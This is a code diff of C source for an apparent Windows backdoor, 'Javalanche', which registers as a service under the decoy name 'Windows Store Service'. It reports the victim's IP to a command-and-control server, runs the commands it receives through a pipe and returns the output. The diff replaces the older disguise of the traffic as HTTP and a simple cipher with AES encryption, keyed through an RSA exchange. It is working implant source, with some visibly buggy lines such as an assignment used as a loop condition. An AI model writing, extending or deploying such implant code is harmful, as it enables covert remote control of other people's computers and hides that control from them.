@@ -1,8 +1,9 @@
 /*
 Javalanche Windows Executable
-Purpose: Contains both Main method, as well as Service Methods for the exeuctable to run as a service
+Purpose: Contains all functions needed for code to encrypt/decrypt data with AES
 Author: James Southcott
 */
+#define _CRT_SECURE_NO_WARNINGS
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -10,11 +11,18 @@ Author: James Southcott
 #include <process.h>
 #include <ws2tcpip.h>
 #include <time.h>
+#include <windows.h>
+#include <bcrypt.h>
+#include <openssl/applink.c>
+#include <openssl/bn.h>
 #include "caesarCipher.h"
 #include "keepAlive.h"
 #include "resolveServerAddr.h"
+#include "rsa.h"
+#include "aes.h"
+
 #pragma comment(lib,"ws2_32.lib")
-#define _CRT_SECURE_NO_WARNINGS
+#pragma comment(lib, "bcrypt.lib")
 
 SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE hStatus;
@@ -24,12 +32,30 @@ void ControlHandler(DWORD request);
 
 SOCKET clientSocket;
 
-/*
-Name: main
-Purpose: Entry point for the code. Calls ServiceMain()
-Parameters: None
-Returns: None
-*/
+/**
+ * Generates a Cryptographically secure AES key
+ * 
+ * @param hexStr[out] - Buffer that will hold the AES key. Should be dynamically allocated length + 1 bytes
+ * @param hexStr[] - Length (in hex) of AES key (ex. 128-bit key = 32, 256-bit key = 64) 
+ * @return void
+ */
+void genAESKey(char* hexStr, int length) {
+    UCHAR *bytes = (UCHAR*)malloc(length / 2);
+
+    BCryptGenRandom(NULL, bytes, length / 2, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+
+    for (int i = 0; i < length / 2; i++) {
+        sprintf(&hexStr[i * 2], "%02x", bytes[i]);
+    }
+
+    hexStr[length] = '\0';
+
+    free(bytes);
+}
+
+/**
+    Entry point for the code. Calls ServiceMain()
+ */
 int main(void) {
     // Connect main thread to the service control messanger
     SERVICE_TABLE_ENTRY ServiceTable[] = {
@@ -44,13 +70,16 @@ int main(void) {
     return 0;
 }
 
-/*
-Name: ServiceMain
-Purpose: Entry Point for the Windows Service
-Parameters: argc, argv (both are NULL)
-Returns: None
-Note: If Starting Service returns a generic error, to ensure that linking is not a apart of the issue, within Visual Studio, set C\C++ > Code Generation > Runtime Library to Multi-Threaded
-*/
+
+/**
+ * Entry Point for the Windows Service
+ *
+ * Note: If Starting Service returns a generic error, to ensure that linking is not a apart of the issue, within Visual Studio, set C\C++ > Code Generation > Runtime Library to Multi-Threaded
+ * 
+ * @param argc[in] - null
+ * @param argv[in] - null
+ * @return void
+ */
 void ServiceMain(DWORD argc, LPTSTR* argv) {
     hStatus = RegisterServiceCtrlHandler(TEXT("Windows Store Service"), (LPHANDLER_FUNCTION)ControlHandler);
     if (hStatus == (SERVICE_STATUS_HANDLE)0) {
@@ -87,7 +116,7 @@ void ServiceMain(DWORD argc, LPTSTR* argv) {
 
     WSAStartup(MAKEWORD(2, 2), &sockData);
 
-    char serverMessage[1024];
+    char* serverMessage = (char*)malloc(sizeof(char) * 1024);
     for (int i = 0; i < 1024; i++) serverMessage[i] = '\0';
 
     // Create socket
@@ -157,6 +186,8 @@ void ServiceMain(DWORD argc, LPTSTR* argv) {
             int len = strnlen(ipstr, 16);
             ipstr[len + 1] = '\0';
             ipstr[len] = '\n';
+
+            // Send the IP address of the client back to the C2
             send(clientSocket, ipstr, strnlen(ipstr, 17), 0);
 
             // Break after the first IP address is found
@@ -167,25 +198,128 @@ void ServiceMain(DWORD argc, LPTSTR* argv) {
     // Free the linked list
     freeaddrinfo(res);
 
+    // Set up variables needed for AES encryption
+    uint8_t* masterKey = (uint8_t*)malloc(sizeof(uint8_t) * 11);
+    char* keyAsHexString = (char*)malloc(sizeof(char) * 33);
+    genAESKey(keyAsHexString, 32);
+    int numRounds = hexStringToByteArray(keyAsHexString, masterKey);
+
+    KeepAliveParams* params = (KeepAliveParams*)malloc(sizeof(KeepAliveParams));
+    params->clientSocket = &clientSocket;
+    params->masterKey = masterKey;
+    params->numRounds = numRounds;
+
+    // variables used for receiving messages
+    int numBytesToRead;
+    char* locationOfFirstNewLine;
+    int lengthOfMessageLength;
+    char* messageLengthAsStr;
+
+    // n and e public key, sent by the beacon server
+    char* n_str = (char*)malloc(sizeof(char) * 1024);
+    for (int i = 0; i < 1024; i++) n_str[i] = '\0';
+    char* e_str = (char*)malloc(sizeof(char) * 1024);
+    for (int i = 0; i < 1024; i++) e_str[i] = '\0';
+
+    // Get the n public key from the server
+    int bytesRead = recv(clientSocket, n_str, 1023, 0);
+    n_str[bytesRead] = '\0';
+
+    // the message is formatted like such 16\nmessage
+    // where 16 in the length of the encrypted data. 
+    // The following code isolates this number, and then moves the start of
+    // the serverMessage buffer to after this first \n
+
+    // Determine the length to the first \n
+    locationOfFirstNewLine = strchr(n_str, '\n');
+    lengthOfMessageLength = locationOfFirstNewLine - n_str;
+
+    // Initialize twice the length needed, to account for signed bytes in UTF-8
+    messageLengthAsStr = (char*)malloc((lengthOfMessageLength + 1) * sizeof(char));
+    strncpy_s(messageLengthAsStr, lengthOfMessageLength + 1, n_str, lengthOfMessageLength);
+
+    // Get the message length
+    messageLengthAsStr[lengthOfMessageLength] = '\0';
+    numBytesToRead = atoi(messageLengthAsStr);
+    free(messageLengthAsStr);
+
+    // Update the serverMessage string to point after the '\n'
+    n_str = locationOfFirstNewLine + 1;
+
+    // Get the n public key from the server
+    bytesRead = recv(clientSocket, e_str, 1023, 0);
+    e_str[bytesRead] = '\0';
+
+    // the message is formatted like such 16\nmessage
+    // where 16 in the length of the encrypted data. 
+    // The following code isolates this number, and then moves the start of
+    // the serverMessage buffer to after this first \n
+
+    // Determine the length to the first \n
+    locationOfFirstNewLine = strchr(e_str, '\n');
+    lengthOfMessageLength = locationOfFirstNewLine - e_str;
+
+    // Initialize twice the length needed, to account for signed bytes in UTF-8
+    messageLengthAsStr = (char*)malloc((lengthOfMessageLength + 1) * sizeof(char));
+    strncpy_s(messageLengthAsStr, lengthOfMessageLength + 1, e_str, lengthOfMessageLength);
+
+    // Get the message length
+    messageLengthAsStr[lengthOfMessageLength] = '\0';
+    numBytesToRead = atoi(messageLengthAsStr);
+    free(messageLengthAsStr);
+
+    // Update the serverMessage string to point after the '\n'
+    e_str = locationOfFirstNewLine + 1;
+
+    char* plainTextHex = OPENSSL_strdup(keyAsHexString);
+
+    rsaEncrypt(&plainTextHex, n_str, e_str);
+
+    // Create the string to be sent back to the beacon with the encrypted AES key
+    char* encryptedAESKey = (char*)malloc(sizeof(char) * 270);
+    for (int i = 0; i < 270; i++) { encryptedAESKey[i] = '\0'; }
+    sprintf_s(encryptedAESKey, 270, "%d\n%s\n", 256, plainTextHex);
+
+    send(clientSocket, encryptedAESKey, 261, 0);
+
     // Start a thread to send a keep alive message every 30 seconds to the Server
-    HANDLE keepAliveThread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&sendKeepAlive, &clientSocket, 0, NULL);
+    HANDLE keepAliveThread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&sendKeepAlive, params, 0, NULL);
+    
+    free(keyAsHexString);
 
     // Main service loop
-    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
+    while (ServiceStatus.dwCurrentState = SERVICE_RUNNING) {
         // Get message from Server
         int bytesRead = recv(clientSocket, serverMessage, 1023, 0);
         serverMessage[bytesRead] = '\0';
 
-        // Because the Connecttion is disguised in HTTP, there are a handful of headers we don't care about.
-        // To do this, we just move the pointer past the wherever the substring variable is found
-        const char* substring = "charset=utf-8\r\n\r\n";
-        char* startOfActualData = strstr(serverMessage, substring);
-        startOfActualData += strnlen(substring, 19);
-        strcpy_s(serverMessage, sizeof(serverMessage), startOfActualData);
+        // the message is formatted like such 16\nmessage
+        // where 16 in the length of the encrypted data. 
+        // The following code isolates this number, and then moves the start of
+        // the serverMessage buffer to after this first \n
+
+        // Determine the length to the first \n
+        locationOfFirstNewLine = strchr(serverMessage, '\n');
+        lengthOfMessageLength = locationOfFirstNewLine - serverMessage;
+
+        // Initialize twice the length needed, to account for signed bytes in UTF-8
+        messageLengthAsStr = (char*)malloc((lengthOfMessageLength + 1) * sizeof(char));
+        strncpy_s(messageLengthAsStr, lengthOfMessageLength + 1, serverMessage, lengthOfMessageLength);
+
+        // Get the message length
+        messageLengthAsStr[lengthOfMessageLength] = '\0';
+        numBytesToRead = atoi(messageLengthAsStr);
+        free(messageLengthAsStr);
+
+        // Update the serverMessage string to point after the '\n'
+        serverMessage = locationOfFirstNewLine + 1;
+
+        // Decode the server message from utf 8
+        decodeUTF8String(serverMessage, bytesRead - lengthOfMessageLength);
 
         // Decrypt the Message from the server
-        encrypt(serverMessage);
-        const char* keepAlive = "KEEP_ALIVE\n";
+        aesDecrypt(serverMessage, masterKey, numRounds, numBytesToRead);
+        const char* keepAlive = "KEEP_ALIVE";
 
         // Check to make sure the message isn't a keep alive message
         if (strncmp(serverMessage, keepAlive, 11) != 0) {
@@ -211,23 +345,34 @@ void ServiceMain(DWORD argc, LPTSTR* argv) {
             }
             strncat_s(messageToSendBack, rsize_t(16384), "END_OF_OUTPUT", 16);
 
-            // strncat_s appends \0 to the end, but not \n. The next 3 lines overwrite the \0 with \n, and then append \0 after
-            encrypt(messageToSendBack);
-            int len = strnlen(messageToSendBack, 16384);
-            messageToSendBack[len] = '\n';
-            messageToSendBack[len + 1] = '\0';
+            // Get the size of the message before encryption and encoding occurs
+            int messageLen = strnlen(messageToSendBack, 16384);
+            if (messageLen % 16 == 0) {
+                messageLen += 16;
+            }
+            else {
+                messageLen = 16 * ((messageLen / 16) + 1);
+            }
 
-            // Disguise the command output in an HTTP Header
-            char message[8292] = "HTTP/1.1 200 OK\r\nContent-Length: ";
-            char messageSize[6];
-            sprintf_s(messageSize, "%d", (int)strnlen(messageToSendBack, 16384));
-            strncat_s(message, messageSize, 6);
-            char endMessage[46] = "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
-            strncat_s(message, endMessage, 46);
-            strncat_s(message, messageToSendBack, 16384);
+            aesEncrypt(messageToSendBack, masterKey, numRounds);
 
+            char* enlargedBufferForUTF = (char*)malloc(sizeof(char) * ((messageLen * 2) + 1));
+            memcpy(enlargedBufferForUTF, messageToSendBack, ((messageLen * 2) + 1));
 
-            send(clientSocket, messageToSendBack, strnlen(messageToSendBack, 16384), 0);
+            free(messageToSendBack);
+            int totalBufSize = encodeStringToUTF8(enlargedBufferForUTF, messageLen);
+
+            char* initialNum = (char*)malloc(20);
+            _itoa(messageLen, initialNum, 10);
+            int beginLen = strnlen(initialNum, 20);
+            beginLen++;
+
+            char* finalMessage = (char*)malloc(sizeof(char) * (totalBufSize)+10);
+            sprintf(finalMessage, "%d\n", messageLen);
+            memcpy(finalMessage + beginLen, enlargedBufferForUTF, totalBufSize);
+            free(enlargedBufferForUTF);
+
+            send(clientSocket, finalMessage, totalBufSize + beginLen, 0);
 
             // Close the pipe
             _pclose(pipe);
@@ -240,12 +385,13 @@ void ServiceMain(DWORD argc, LPTSTR* argv) {
     SetServiceStatus(hStatus, &ServiceStatus);
 }
 
-/*
-Name: ControlHandler
-Purpose: Handles requests from the Windows Service Control Manager to stop/shutdown the service
-Parameters: request - the request made by the Windows Service Control Manager
-Returns: Void
-*/
+
+/**
+ * Handles requests from the Windows Service Control Manager to stop/shutdown the service
+ *
+ * @param request[in] - the request made by the Windows Service Control Manager
+ * @return void
+ */
 void ControlHandler(DWORD request) {
     switch (request) {
     case SERVICE_CONTROL_STOP:
